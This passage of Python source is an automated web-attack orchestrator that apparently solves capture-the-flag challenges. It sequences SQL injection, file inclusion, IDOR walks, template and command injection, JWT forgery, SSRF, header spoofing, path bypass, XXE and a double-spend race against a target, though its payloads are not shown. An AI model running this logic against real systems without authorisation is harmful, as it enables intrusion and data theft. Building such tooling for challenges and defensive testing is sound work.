        return [(route, "router-recon", False, "router-recon", False, None, None, True)
                for route in routes[:4]]

    def _double_spend_indicated(self):
        """The saved challenge contract names the race before its controls can authorize a burst.

        The 405/403/one-credit controls remain the mutation authority inside ``double_spend``.  This offline
        front-door only prevents that reader from charging an exploratory GET to every unrelated two-route
        target (notably the already-tuned SSRF and session-fixation classes).
        """
        # In Mastery ``prompt_text`` and the challenge id are shared by every
        # target.  They cannot authorize a terminal mutation on a sibling.
        # ``post_prompt`` is narrowed by solve_targets; add only this target's
        # question, clue document and already-fetched clue-route controls.
        doc = self._clues_doc()
        local_parts = [
            str(self.post_prompt or "")[:20_000],
            str((self.forge_target or {}).get("question") or "")[:4_000],
        ]
        if isinstance(doc, dict):
            local_parts.append(json.dumps(doc, separators=(",", ":"), default=str)[:20_000])
            for key in ("feature_route", "secondary_route"):
                route = self._clue_route(doc, key)
                page = self._page(route) if route else None
                if isinstance(page, dict):
                    # ``text`` is one coherent carrier view.  Never use the
                    # page's joined evidence_text: MIME siblings and headers
                    # could otherwise synthesize a mutation-authority phrase.
                    local_parts.append(str(page.get("text") or "")[:8_000])
        signal = re.compile(
            r"(?is)(?:\bdouble[ _-]?spen(?:d|t|ding)\b|"
            r"\bone[ _-]?credit\b.{0,160}\b(?:race|twice|two[ _-]?(?:purchases|spends?))\b|"
            r"\brace\b.{0,120}\b(?:credit|purchase|redeem|ledger)\b)"
        )
        return any(signal.search(part) for part in local_parts)

    def _early_clue_header(self, pages):
        """Dispatch an exact proxy/loopback denial before the generic exploit waves."""
        signalled = []
        for page in pages or ():
            if page.get("status") not in (401, 403):
                continue
            local = str(page.get("text") or "") + "\n" + json.dumps(page.get("headers") or {})
            if re.search(r"(?i)\b(?:loopback[_ -]?only|trusted[_ -]?(?:reverse[_ -]?)?proxy|"
                         r"proxy[_ -]?trust|internal[_ -](?:client|only)|localhost[_ -]?only)\b", local):
                signalled.append(page)
        if not signalled:
            return False
        self.wave(self._header_items(signalled))
        return self.done() or self._payoff_terminal()

    def _post_chain_indicated(self):
        """Offline target-local gate for the observed D11-D13 peer.

        A secondary route is the differential contract used by D12/D13. A
        lone feature route needs explicit template/expression vocabulary from
        this target's clues or own prompt. This keeps post_chain ahead of a
        noisy crawl without charging generic privileged-route challenges an
        applicability GET.
        """
        if _post_chain is None:
            return False
        doc = self._clues_doc()
        if not isinstance(doc, dict):
            return False
        clues = {str(key): value for key, value in doc.items() if isinstance(value, str)}
        if not self._clue_route(clues, "feature_route"):
            return False
        if self._clue_route(clues, "secondary_route"):
            return True
        local = json.dumps(doc, separators=(",", ":"), default=str)[:20_000]
        local += "\n" + str(self.post_prompt or "")[:20_000]
        return bool(re.search(
            r"(?i)\b(?:template|renderer|render_engine|template_engine|expression_engine|"
            r"evaluat(?:e|es|ed|ion)|expression|incantation|erb)\b", local
        ))

    def _remote_policy_indicated(self):
        """Offline exact gate for the GET-only remote-policy fail-open reader."""
        if _remote_policy is None:
            return False
        doc = self._clues_doc()
        if not isinstance(doc, dict):
            return False
        feature = self._clue_route(doc, "feature_route")
        policy_format = self._clue_route(doc, "policy_format_route")
        expected = str(doc.get("expected_behavior") or "")[:2000]
        return bool(
            feature and policy_format and feature != policy_format
            and re.search(r"(?is)\bdeny\b.{0,100}\baccess\b", expected)
            and re.search(r"(?i)\b(?:policy|service|remote)\b", expected)
            and re.search(r"(?i)\b(?:unavailable|failure|failed|error|unreachable|exception)\b", expected)
        )

    def _contract_executor_indicated(self):
        """Offline gate for the B-149 target-described contract executor.

        Fires only when /api/clues publishes a self-describing ``contract`` graph
        (an advertised action route plus an explicit control/mutation pair) that
        the specific exact readers above did not already claim.  A target with no
        such graph pays no request.  The executor's own default policy keeps it
        GET-only, so an advertised mutation is a finding, never a send, here.
        """
        if _contract_executor is None:
            return False
        doc = self._clues_doc()
        if not isinstance(doc, dict):
            return False
        graph = doc.get("contract")
        if not isinstance(graph, dict):
            return False
        return bool(self._clue_route(graph, "action_route")
                    and "control" in graph and "mutation" in graph)

    def _delegated_identity_indicated(self):
        """Offline exact gate for the GET-only delegated-identity reader."""
        if _delegated_identity is None:
            return False
        doc = self._clues_doc()
        if not isinstance(doc, dict):
            return False
        routes = [self._clue_route(doc, key) for key in (
            "feature_route", "identity_directory_route", "secondary_route",
        )]
        role = doc.get("current_role")
        return bool(
            isinstance(role, str) and role
            and all(routes) and len(set(routes)) == len(routes)
        )

    def _gateway_role_indicated(self):
        """Offline gate for the B-236 gateway-context / Vary-disclosed role-header reader.

        Entirely cached: the clue document names a feature route and this Hunter's own plain GET of that
        route is a trust-boundary denial (a 401/403 JSON error naming the gateway/proxy/loopback layer, or a
        Vary naming a client-address field).  A target with any other shape pays no request.
        """
        if _gateway_role is None:
            return False
        doc = self._clues_doc()
        if not isinstance(doc, dict):
            return False
        feature = self._clue_route(doc, "feature_route")
        page = self._page(feature) if feature else None
        if not isinstance(page, dict):
            return False
        response = page.get("_peer_response") if isinstance(page.get("_peer_response"), dict) else page
        try:
            return bool(_gateway_role.indicated(response))
        except Exception:
            return False

    def _queued_owner_indicated(self):
        """Offline exact gate for the terminal queued-owner reader."""
        if _queued_owner is None:
            return False
        doc = self._clues_doc()
        if not isinstance(doc, dict):
            return False
        routes = [self._clue_route(doc, key) for key in (
            "feature_route", "owner_directory_route", "secondary_route",
        )]
        role = doc.get("current_role")
        return bool(
            isinstance(role, str) and role
            and all(routes) and len(set(routes)) == len(routes)
        )

    def _endpoint_inventory_indicated(self):
        """True when already-fetched bytes explicitly advertise descriptor depth.

        Exact API evidence earns an early inventory pass. Blind common-name
        discovery remains a bounded fallback, but is deferred behind the
        established backup/IDOR/SQLi/LFI reads so those fast paths do not pay
        six unrelated documentation requests.
        """
        for page in list(self.pages.values()):
            if not isinstance(page, dict) or page.get("tag"):
                continue
            status = page.get("status")
            if not isinstance(status, int) or not 200 <= status < 300:
                continue
            path = str(page.get("path") or "").split("?", 1)[0].lower()
            text = str(page.get("text") or "")[:200_000]
            doc = self.json_of(page)
            if isinstance(doc, dict) and any(key in doc for key in (
                    "openapi", "swagger", "asyncapi", "openrpc")):
                return True
            if any(token in path for token in (
                    "openapi", "swagger", "api-docs", "asyncapi", "openrpc", "wsdl", ".proto")):
                return True
            if re.search(
                    r"(?i)(?:\b(?:openapi|swagger|asyncapi|openrpc|wsdl|grpc[-_ ]?web|"
                    r"sourcemappingurl)\b|\bsitemap\s*:)", text):
                return True
            for tag in re.finditer(r"(?is)<(?:a|link)\b([^>]*)>", text):
                attrs = _attrs(tag.group(1))
                rels = {part.lower() for part in str(attrs.get("rel") or "").split()}
                if "service-desc" in rels and (attrs.get("href") or attrs.get("src")):
                    return True
            for match in _ATTR_URL.finditer(text):
                raw = next((group for group in match.groups() if group is not None), "").lower()
                base = raw.split("?", 1)[0]
                if (base.endswith((".js", ".mjs", ".map", ".proto", ".wsdl"))
                        or any(token in base for token in (
                            "openapi", "swagger", "api-docs", "asyncapi", "openrpc"))):
                    return True
        return False

    def _endpoint_prepass_indicated(self):
        """True only for a wave-1 link to not-yet-loaded discovery bytes.

        An exact contract already present in ``/api/clues`` needs no inventory
        pass.  Restricting this gate to links, scripts, maps and Sitemap lines
        keeps those cold classes at their frozen request counts.
        """
        for page in list(self.pages.values()):
            if not isinstance(page, dict) or page.get("tag"):
                continue
            status = page.get("status")
            if not isinstance(status, int) or not 200 <= status < 300:
                continue
            text = str(page.get("text") or "")[:200_000]
            if (re.search(r"(?im)^\s*Sitemap\s*:\s*\S+", text)
                    or re.search(r"(?i)sourceMappingURL\s*=", text)):
                return True
            for tag in re.finditer(r"(?is)<(?:a|link)\b([^>]*)>", text):
                attrs = _attrs(tag.group(1))
                rels = {part.lower() for part in str(attrs.get("rel") or "").split()}
                if "service-desc" in rels and (attrs.get("href") or attrs.get("src")):
                    return True
            for match in _ATTR_URL.finditer(text):
                raw = next((group for group in match.groups() if group is not None), "").lower()
                base = raw.split("?", 1)[0]
                if (base.endswith((".js", ".mjs", ".map", ".proto", ".wsdl"))
                        or any(token in base for token in (
                            "openapi", "swagger", "api-docs", "asyncapi", "openrpc"))):
                    return True
        return False

    def _descriptor_prefetch_items(self):
        """Row 559: the conventional descriptor GETs, for one parallel wave before an UNSIGNALLED inventory.

        On such a target endpoint inventory has no linked script, map, spec or Sitemap line to read first, so
        its first wire requests are exactly /sitemap.xml and the Swagger/OpenAPI spelling ladder, in this
        order, up to its discovery budget.  Sending that same prefix at once costs one round trip.
        """
        if _endpoint_inventory is None or self.client is None or not isinstance(self.forge_target, dict):
            return []
        remaining = max(0, self.max_requests - self.requests)
        if remaining <= 0 or self.stop.is_set() or self._gone():
            return []
        # A prompt that names a descriptor gives inventory an exact read before this ladder; keep its order.
        if re.search(r"(?i)openapi|swagger|asyncapi|openrpc|wsdl|\.proto\b|sitemap|api-docs",
                     str(self.post_prompt or "")[:20_000]):
            return []
        budget = min(ENDPOINT_DISCOVERY_MAX_REQUESTS, max(0, remaining - 1))
        items = [(p, "plain", False, "recon", False) for p in EARLY_DESCRIPTOR_PATHS[:budget]
                 if p not in self.pages]
        self.prefetched_descriptors.update(item[0] for item in items)
        return items

    def _run_endpoint_phase(self, prefetch=False):
        """Run one bounded discovery plus exact contract-GET phase."""
        inventory_start = self.requests
        previous_ceiling = self.request_ceiling
        phase_ceiling = min(self.max_requests, inventory_start + ENDPOINT_PHASE_MAX_REQUESTS)
        self.request_ceiling = (phase_ceiling if previous_ceiling is None
                                else min(previous_ceiling, phase_ceiling))
        try:
            if prefetch and not self._endpoint_inventory_indicated():
                self.wave(self._descriptor_prefetch_items())
            inventory_items = [] if self._gone() else self._run_endpoint_inventory()
            # A prior plain route must not suppress a version header or vendor
            # Accept request on that same path: tagged variants have distinct
            # cache keys, while identical wire requests were deduplicated by
            # _run_endpoint_inventory().
            self.wave(inventory_items)
        finally:
            if isinstance(self.endpoint_inventory, dict):
                self.endpoint_inventory["phase_requests"] = self.requests - inventory_start
                self.endpoint_inventory["phase_max_requests"] = ENDPOINT_PHASE_MAX_REQUESTS
            self.request_ceiling = previous_ceiling

    def _peer_used_wire(self, label):
        """Whether a prior peer pass consumed (or ambiguously reported) wire.

        A malformed accounting field fails closed.  Exact stateful protocols
        must never be replayed merely because later discovery found another
        document.
        """
        prior = self.peer_meta.get(label)
        if not isinstance(prior, dict):
            return False
        for key in ("requests", "posts", "issue_requests", "redeem_requests",
                    "entity_requests", "duplicate_requests", "race_started"):
            value = prior.get(key)
            try:
                used = (bool(value) if isinstance(value, bool)
                        else int(value or 0) > 0)
                if used:
                    return True
            except (TypeError, ValueError, OverflowError):
                return True
        return False

    def _retry_descriptor_peers(self):
        """Retry zero-wire exact peers after any bounded discovery layer.

        The first peer pass happens immediately after ``/openapi.json`` and the
        clue document.  A service descriptor may instead be linked from HTML,
        JavaScript, a sitemap, or a non-default documentation route found only
        by the bounded endpoint phase.  Re-running a peer that used no wire is
        safe and lets it consume those newly preloaded bytes; a peer that sent
        even one control is never repeated.  Router must run first because its
        fresh dispatch plan ranks the advanced and Werkzeug executors.
        """
        peers = (
            (_recon_router, "recon-router", True),
            (_recon_advanced, "recon-advanced", True),
            (_recon_werkzeug, "recon-werkzeug", True),
            (_graphql_post_read, "graphql-post-read", False),
            (_ssrf_body, "post-body-ssrf", True),
            (_xml_read, "xml-read", True),
            (_parameter_pollution, "parameter-pollution", False),
        )
        for module, label, stateful in peers:
            if self._peer_used_wire(label):
                continue
            handled, proof = self._run_peer(module, label, stateful=stateful)
            if handled:
                return True, proof
        return False, None

    def _legacy_read_waves(self, reads):
        """Run the original wave-3/4 readers; return the finishing wave or None.

        This can safely run again after late descriptor discovery: fetch()'s
        cache suppresses every old wire request, leaving only newly discovered
        forms/routes eligible.
        """
        first, rest = [], []
        listings = []
        robots = self._page(self.robots_route)
        for path in self._robots_paths(robots):
            last = path.rstrip("/").rsplit("/", 1)[-1]
            if path.endswith("/") or "." not in last:
                listings.append(path)
        backup = self._backup_files(listings)
        lfi = self._lfi(reads)
        sqli = self._sqli(reads)
        idor = self._idor(reads)
        own, prefixes = idor[2], idor[3]
        phases = [
            (10_000, 0, backup[0], backup[1]),
            (self._router_phase_rank("proof-hunt:lfi"), 1, lfi[0], lfi[1]),
            (self._router_phase_rank("proof-hunt:get-sqli"), 2, sqli[0], sqli[1]),
            (self._router_phase_rank("proof-hunt:idor-feed-walk"), 3, idor[0], idor[1]),
        ]
        for _rank, _stable, phase_first, phase_rest in sorted(phases):
            first += phase_first
            rest += phase_rest
        self.wave(first + rest)
        if self.done():
            return "wave3"
        if self._payoff_terminal():
            return "wave3"
        if prefixes and own:
            walk = []
            for value in sorted(own)[:4]:
                for delta in (1, -1, 2, -2):
                    if value + delta > 0:
                        walk.append((f"{prefixes[0]}/{value + delta}", "idor", True, "idor-walk", True))
            self.wave(walk[:12])
            if self.done():
                return "wave4"
        return "wave4" if self._payoff_terminal() else None

    def run(self):
        if self.client is None:
            return None
        # wave 1: the landing page (redirects followed by hand), robots.txt, the route inventory
        self.wave([(self.app_root, "plain", False, "recon", False),
                   (self.robots_route, "plain", False, "recon", False),
                   (self.clues_route, "plain", False, "recon", False),
                   (self.openapi_route, "plain", False, "recon", False)])
        root = self._land(self.app_root)
        plain_pages = [p for p in (root, self._page(self.clues_route)) if p]
        robots = self._page(self.robots_route)
        if self._gone(root):
            return self._finish("completed")

        # Target-linked API/service documents are part of the fingerprint, not
        # a fallback.  Complete the bounded indicated inventory before *any*
        # peer may mutate state; otherwise an exact linked protocol can lose a
        # race to a plausible but lower-ranked clue-driven POST.  Blind
        # conventional-name inventory remains in its historical late slot.
        inventory_ran = False
        if self._endpoint_prepass_indicated():
            inventory_ran = True
            self._run_endpoint_phase()
            if self.done() or self._payoff_terminal():
                return self._finish("inventory-prepass")

        # Recon-first routing.  The first wave identifies exact discovery
        # contracts; their two-to-four target-local controls are fetched in one
        # parallel round trip, then the ranked router tries the highest exact
        # class before generic exploit waves.  An unrelated target pays zero
        # additional requests.  The router's only mutation is the exact signed
        # manifest contract, so a started POST is terminal; its SSRF->IDOR path
        # is GET-only and may fall through on a clean miss.
        router_items = self._recon_router_discovery_items()
        if router_items:
            self.wave(router_items)
        handled, proof = self._run_peer(_recon_router, "recon-router", stateful=True)
        if handled:
            return proof

        # Advanced protocols require a complete machine-readable contract in
        # the already-fetched target bytes.  The peer costs zero wire on prose
        # hints or ambiguity.  IMDS token relay and credential-backed reads,
        # plus every POST-backed canary/parser protocol, publish a terminal
        # boundary so a failed one-shot cannot fall through to another class.
        handled, proof = self._run_peer(_recon_advanced, "recon-advanced", stateful=True)
        if handled:
            return proof

        # The debugger reader is a separate exact contract because its two
        # generated GETs carry a derived PIN and a solver-owned bounded read
        # expression.  It sends nothing without every derivation input, exact
        # version/algorithm, safe objective path and a two-request reserve;
        # once PIN auth begins the protocol is terminal.
        handled, proof = self._run_peer(_recon_werkzeug, "recon-werkzeug", stateful=True)
        if handled:
            return proof

        # A complete target-local declarative contract may authorize one
        # challenge-synthetic control -> action -> correlated-readback group.
        # The peer costs zero wire without that exact object and reserves the
        # full group before mutation; ambiguous POST outcomes are terminal.
        handled, proof = self._run_peer(
            _state_transaction, "state-transaction", stateful=True)
        if handled:
            return proof

        # These two contracts are unmistakable from the target-local clue document and otherwise cost zero
        # requests. Run them before older clue readers so reset recovery is not charged an irrelevant GET of its
        # token-issue route, and POST-only GraphQL does not fall through a GET-only field reader first.
        early_exact_peers = [
            (self._router_phase_rank("peer:graphql-query-read", 10_001), 1,
             _graphql_post_read, "graphql-post-read", False),
            (10_000, 0, _reset_rebind, "reset-rebind", True),
        ]
        xxe_planned = self._router_phase_rank("peer:xxe-read") < 10_000
        if xxe_planned:
            early_exact_peers.append((self._router_phase_rank("peer:xxe-read"), 2,
                                      _xml_read, "xml-read", True))
        for _rank, _stable, module, label, stateful in sorted(early_exact_peers):
            if self._peer_used_wire(label):
                continue
            handled, proof = self._run_peer(module, label, stateful=stateful)
            if handled:
                return proof

        # Protocol-directed readers go before a normal GET of every clue route.  In particular, an advertised
        # SSE endpoint may intentionally keep its HTTP response open, while Socket to Me's exact feature route
        # first supplies a short 426 control and then a server-first WebSocket frame.  With no exact target-local
        # real-time contract the peer costs zero requests.
        handled, proof = self._run_peer(_realtime_read, "realtime-read", stateful=False)
        if handled:
            return proof

        # Exact feature/secondary routes are plain controls.  This makes protocol errors available to narrow
        # peers and lets a clue-advertised benign `/submit-*` GET reach the proxy-header reader without weakening
        # the guard for guessed or fatal routes.
        clue_controls = self._trusted_clue_controls()

        # Delegated identity is not a generic trusted-header spray.  A cached
        # target-local clue must name a feature, identity directory and
        # secondary route; the peer then proves the caller->records-owner
        # relationship and two denied controls before one GET-only owner replay.
        if self._delegated_identity_indicated():
            handled, proof = self._run_peer(
                _delegated_identity, "delegated-identity", stateful=False)
            if handled:
                return proof

        # Queue-owner binding is the adjacent stateful contract.  Its peer
        # consumes only a complete clue/directory/control chain, reserves the
        # POST plus correlated audit read before mutation, and is terminal as
        # soon as its single POST begins.
        if self._queued_owner_indicated():
            handled, proof = self._run_peer(
                _queued_owner, "queued-owner-binding", stateful=True)
            if handled:
                return proof

        # A remote-policy decoder is a read-only authorization path, but its
        # winning value is deliberately malformed rather than a generic web
        # payload.  The peer consumes only the exact clue/format contract, a
        # valid replay control and one invalid-base64url GET; unrelated targets
        # pay no request because this gate is entirely cached.
        if self._remote_policy_indicated():
            handled, proof = self._run_peer(
                _remote_policy, "remote-policy-fail-open", stateful=False)
            if handled:
                return proof

        # New cold classes are separate bounded contracts, not additions to the generic GET/POST fuzzers.
        # Every peer gates entirely on this target's clue/schema plus controls and therefore sends nothing on an
        # unrelated site.  A double-spend burst or an entity-bearing XML sequence is terminal once begun.
        new_peers = []
        if self._double_spend_indicated():
            new_peers.append((_double_spend, "double-spend", True))
        new_peers.extend((
            (_ssrf_body, "post-body-ssrf", True),
            (_parameter_pollution, "parameter-pollution", False),
        ))
        if not xxe_planned:
            new_peers.insert(1, (_xml_read, "xml-read", True))
        for module, label, stateful in new_peers:
            if self._peer_used_wire(label):
                continue
            handled, proof = self._run_peer(module, label, stateful=stateful)
            if handled:
                return proof

        # wave 1b: the clue-field-driven GET classes (day-06 browser callback, day-08 session fixation), when
        # /api/clues names a callback nonce or a session hint. Specific and fast (2 to a handful of GETs), so
        # tried before the generic shapes; a target with no such clue field skips it untouched.
        if self._clues_dispatch():
            return self._finish("clues")

        # An exact loopback/proxy denial is already a complete dispatch signal; do not spend the legacy waves
        # before the existing header reader.  The header items themselves retain baseline subtraction and the
        # trusted-route/fatal-action split.
        if self._early_clue_header(clue_controls):
            return self._finish("clue-header")

        # The simplest-first POST class belongs before the generic GET payload
        # waves: unsigned flat fields, then an advertised unsigned state blob.
        # A target with no matching self-description costs no additional wire
        # request because /api/clues is handed over from wave 1.
        forge_handled, forged = self._run_forge()
        if forge_handled:
            return forged

        # Clue-gated protocol checks remain GET-only: credentialed CORS with a fixed .invalid Origin,
        # an advertised open redirect with redirects disabled, and passive OIDC/OAuth discovery/JWKS.
        # With no exact target-local contract this costs zero requests. Only a confirmed CORS response can
        # return a proof; redirect and identity metadata are findings for the evidence-driven dispatcher.
        handled, proof = self._run_peer(_passive_checks, "passive-checks", stateful=False)
        if handled:
            return proof

        # Day 16's command runner is unusually self-describing: the clue binds
        # ``input_parameter=path`` to its exact feature route, supplies an inert
        # absolute example, and that example returns a structured stdout /
        # worker-command signal.  Once all three facts agree, try the observed
        # bare-semicolon shape immediately.  The computed marker is still the
        # authority to read anything; a generic path field, a neutral file
        # processor, or a marker that merely echoes falls through untouched.
        # This avoids paying every unrelated GET wave before the confirmed
        # command reader and lets a clue-advertised /execute-* route pass only
        # the trusted-route name guard (query and scope guards remain intact).
        if self._cmdi_clue_fast(plain_pages):
            return self._finish("cmdi-clue")

        # Run the observed D11-D13 peer before unrelated crawl links can spend
        # its budget, but only behind an offline target-local contract gate.
        # Generic one-route clues skip this entirely and retain the historical
        # five-request privileged-route fast path.
        if self._post_chain_indicated():
            handled, proof = self._run_peer(_post_chain, "post-chain", stateful=True)
            if handled:
                return proof

        # B-149: a target may publish a coherent, self-describing contract graph
        # whose shape matches none of the hand-coded readers above (Day 24/25/28).
        # The generic executor runs it last, after every specific reader declined,
        # so an earlier exact contract always wins.  It is GET-only by default
        # (Open O-2): an advertised mutation stops at a structured finding, so this
        # dispatch never sends a state-changing request from Layer 1.
        if self._contract_executor_indicated():
            handled, proof = self._run_peer(
                _contract_executor, "target-described-contract", stateful=False)
            if handled:
                return proof

        # Root/robots/clues/openapi bytes already expose the strongest API
        # signals (linked JS/service-desc, Sitemap, or a versioned document).
        # Honor them before a noisy ordinary-link crawl can consume the shared
        # budget. Unsignalled conventional-name discovery remains deferred.
        if not inventory_ran and self._endpoint_inventory_indicated():
            inventory_ran = True
            self._run_endpoint_phase()
            if self.done() or self._payoff_terminal():
                return self._finish("inventory")
            handled, proof = self._retry_descriptor_peers()
            if handled:
                return proof

        # wave 2: robots paths, routes a JSON page names, the links the landing page offers
        items = []
        listings = []
        for p in self._robots_paths(robots):
            last = p.rstrip("/").rsplit("/", 1)[-1]
            if p.endswith("/") or "." not in last:
                listings.append(p)
                items.append((p, "backup", False, "recon", True))
            else:
                items.append((p, "backup", True, "backup:" + p, True))
        for route in self._json_routes(plain_pages):
            items.append((route, "route", True, "route:" + route, True))
        crawl = [p for p in self.links(root) if not _is_asset(p)][:12]
        items += [(p, "plain", False, "recon", True) for p in crawl]
        if not self._gone():
            # the Day 21 final prep, item 4: the routes the prompt names, payoffs (after every plain item, so a
            # route the site also links is read as the plain page it is)
            known = {it[0] for it in items}
            items += [(r, "promptroute", True, "promptroute:" + r, False) for r in self.routes
                      if r not in known and r not in self.pages]
        self.wave(items)
        if self.done() or self._payoff_terminal():
            return self._finish("wave2")
        handled, proof = self._retry_descriptor_peers()
        if handled:
            return proof

        # B-236: the plain wave-2 GET of the clue feature route is the control.  When it is a trust-boundary
        # denial, walk the target's own Vary disclosures (loopback field, then the application role header)
        # before the generic waves spend the budget on unrelated shapes.  Cached gate; GET-only peer.
        if self._gateway_role_indicated():
            handled, proof = self._run_peer(_gateway_role, "gateway-role-header", stateful=False)
            if handled:
                return proof

        # Follow one more exact JSON route layer before either descriptor
        # fallback or speculative payloads.
        reads = [pg for pg in (self._page(p) for p in list(self.pages)) if pg]
        more = [r for r in self._json_routes(reads) if r not in self.pages]
        self.wave([(r, "route", True, "route:" + r, True) for r in more])
        if self.done() or self._payoff_terminal():
            return self._finish("routes")
        handled, proof = self._retry_descriptor_peers()
        if handled:
            return proof

        # Explicit API/descriptor evidence earns the early depth pass. Blind
        # common-name discovery waits behind the established cheap readers.
        if not inventory_ran and self._endpoint_inventory_indicated():
            inventory_ran = True
            self._run_endpoint_phase()
            if self.done() or self._payoff_terminal():
                return self._finish("inventory")
            handled, proof = self._retry_descriptor_peers()
            if handled:
                return proof
            reads = [pg for pg in (self._page(p) for p in list(self.pages)) if pg]
            more = [r for r in self._json_routes(reads) if r not in self.pages]
            self.wave([(r, "route", True, "route:" + r, True) for r in more])
            if self.done() or self._payoff_terminal():
                return self._finish("routes-after-inventory")

        reads = [pg for pg in (self._page(p) for p in list(self.pages)) if pg]
        finished = self._legacy_read_waves(reads)
        if finished:
            return self._finish(finished)

        if not inventory_ran:
            self._run_endpoint_phase(prefetch=True)
            if self.done() or self._payoff_terminal():
                return self._finish("inventory")
            handled, proof = self._retry_descriptor_peers()
            if handled:
                return proof
            reads = [pg for pg in (self._page(p) for p in list(self.pages)) if pg]
            more = [r for r in self._json_routes(reads) if r not in self.pages]
            self.wave([(r, "route", True, "route:" + r, True) for r in more])
            if self.done() or self._payoff_terminal():
                return self._finish("routes-after-inventory")
            reads = [pg for pg in (self._page(p) for p in list(self.pages)) if pg]
            finished = self._legacy_read_waves(reads)
            if finished:
                return self._finish(finished)

        # wave 5 (round 4, row 383's read-only half): SSTI and cmdi markers, JWT replays
        reads = [pg for pg in (self._page(p) for p in list(self.pages)) if pg and not pg.get("tag")]
        ssti = self._ssti_probes(reads)
        cmdi = self._cmdi_probes(reads)
        jwt = self._jwt_items(reads)
        marker_phases = [
            (self._router_phase_rank("proof-hunt:ssti-read"), 0, "wave",
             [it for c in ssti for it in c["items"]]),
            (self._router_phase_rank("proof-hunt:cmdi"), 1, "wave",
             [it for c in cmdi for it in c["items"]]),
            (self._router_phase_rank("proof-hunt:jwt-read-replay"), 2, "jwt", jwt),
        ]
        pending = []
        for _rank, _stable, kind, items in sorted(marker_phases):
            if kind == "jwt":
                # Preserve the router's phase order, but put a hard wire
                # barrier between each JWT baseline and every corresponding
                # forgery. Non-JWT marker phases on either side remain
                # parallel within their original block.
                self.wave(pending)
                pending = []
                if self.done() or self._payoff_terminal():
                    return self._finish("wave5")
                self.wave(self._jwt_after_controls(items))
                if self.done() or self._payoff_terminal():
                    return self._finish("wave5")
            else:
                pending.extend(items)
        self.wave(pending)
        if self.done() or self._payoff_terminal():
            return self._finish("wave5")

        # wave 6 (round 4): the read payloads behind a confirmed marker, and nothing else
        read_phases = [
            (self._router_phase_rank("proof-hunt:ssti-read"), 0, self._ssti_reads(ssti)),
            (self._router_phase_rank("proof-hunt:cmdi"), 1, self._cmdi_reads(cmdi)),
        ]
        self.wave([item for _rank, _stable, items in sorted(read_phases) for item in items])
        if self.done() or self._payoff_terminal():
            return self._finish("wave6")

        # the Day 21 final prep. Wave 6b: the process environment (LATE_FILES) through the LFI parameters and
        # behind a confirmed SSTI or cmdi marker, and the template's config/env payloads per confirmed syntax.
        reads = [pg for pg in (self._page(p) for p in list(self.pages)) if pg and not pg.get("tag")]
        self.wave(self._late_reads(reads, ssti, cmdi))
        if self.done() or self._payoff_terminal() or self._gone():
            return self._finish("wave6b")

        # wave 7: SSRF (a baseline, then internal URLs), loopback headers on 401/403 paths, a raised role cookie
        # (the original cookie first), the common exposed files
        reads = [pg for pg in (self._page(p) for p in list(self.pages)) if pg and not pg.get("tag")]
        ssrf = self._ssrf(reads)
        # A control must complete before any payload for its parameter.  A
        # single parallel wave only preserves queue order, not wire order, and
        # can race a payoff ahead of its baseline under CPU load.
        for c in ssrf:
            baseline = c.get("baseline")
            if baseline:
                self.fetch(baseline, "ssrf", False, c["group"], offered=False)
        ssrf_payoffs = [it for c in ssrf for it in c["items"] if it[0] != c.get("baseline")]
        self.wave(ssrf_payoffs + self._header_items(reads) + self._cookie_items(reads)
                  + self._exposed_items())
        if self.done() or self._payoff_terminal():
            return self._finish("wave7")

        # wave 8: the SSRF second hop (the routes an internal root lists in JSON, the lines of a '/' listing)
        self.wave(self._ssrf_hop(ssrf))
        if self.done() or self._payoff_terminal():
            return self._finish("wave8")

        # The reference-technique build (READ-ONLY, GET-only payoff shapes after the existing waves). Reached
        # only here: none of the shapes above answered and no novel payoff was seen. Baseline subtraction,
        # payoff-not-plain and the destructive guard are unchanged; no POST. A finished target (410) already
        # returned at wave 6b, so none of these guesses a path on it.
        reads = [pg for pg in (self._page(p) for p in list(self.pages)) if pg and not pg.get("tag")]
        # wave 9: 401/403 path-normalization bypass + web cache deception (path confusion)
        self.wave(self._path_bypass_items(reads) + self._cache_deception(reads))
        if self.done() or self._payoff_terminal():
            return self._finish("wave9")
        # wave 10: GraphQL auto field-read over GET (+ field-suggestion enum); multi-step, its own GETs
        if self._graphql_read():
            return self._finish("graphql-read")
        if self.done() or self._payoff_terminal():
            return self._finish("wave10")

        # wave 11 (the Day-24 SAFE breadth): GET-only / read-only detectors for the classes proof_hunt could not
        # otherwise touch (GraphQL, NoSQLi, XXE surface, prototype pollution, deserialization, JWT RS256/jku).
        # They RECORD findings (self.findings) for the web agent and never bank a proof or send a POST. Reached
        # only when nothing proof-like has shown, so a solved target never pays for them.
        # Recompute after waves 9/10: those reads may themselves expose an XML/blob/JWT surface.
        reads = [pg for pg in (self._page(p) for p in list(self.pages)) if pg and not pg.get("tag")]
        self._breadth(reads)
        return self._finish("wave11")

    def _gone(self, root=None):
        """The landing page answered 410 (a finished target): no unlinked path is guessed on it."""
        for pg in (root, self._page(self.app_root), self._land(self.app_root)):
            if pg and pg.get("status") == 410:
                return True
        return False

    def _finish(self, where):
        novel = self._novel_payoffs()
        decoded_strict, decoded_like = self._decoded_novel_payoffs()

        # The response-carrier decoder can promote (for example) a gzip+base64
        # JSON leaf directly into ``payoff`` while the older location decoder
        # finds a base64 header.  Decide uniqueness over the union, not by
        # returning whichever representation happens to be checked first.
        direct_strict = {value for value in novel if is_proof(value)}
        strict = direct_strict | decoded_strict
        proof_like = {value.casefold() for value in novel} | {
            value.casefold() for value in decoded_like
        }
        safe = not getattr(self, "baseline_incomplete", False) and not getattr(self, "candidates", None)
        ans = next(iter(strict)) if safe and len(strict) == 1 and len(proof_like) == 1 else None
        if ans is not None and ans.casefold() == next(iter(proof_like)):
            if ans in direct_strict:
                self.shape = (self.payoff.get(ans) or (None, None))[1]
            else:
                self.decoded = ans
                self.shape = "decoded"
        else:
            ans = None
            self.stopped = self.stopped or ("baseline response incomplete"
                                            if getattr(self, "baseline_incomplete", False) else
                                            "several novel payoff proofs" if len(proof_like) > 1 else
                                            "proof form not the judged one" if proof_like else
                                            "baseline proof decoy only" if self.plain else "no proof")
        self.where = where
        return ans

    def _land(self, path):
        """The page `path` ended on (after the same-host redirects fetch() followed)."""
        pg = self._page(path)
        for _ in range(MAX_HOPS):
            if not pg or not pg.get("next"):
                break
            pg = self._page(pg["next"]) or pg
            if not pg.get("next") or pg.get("path") == path:
                break
        return pg

    @staticmethod
    def _robots_paths(robots):
        out = []
        if not robots or robots.get("status") != 200:
            return out
        for line in robots.get("text", "").splitlines()[:200]:
            k, _, v = line.partition(":")
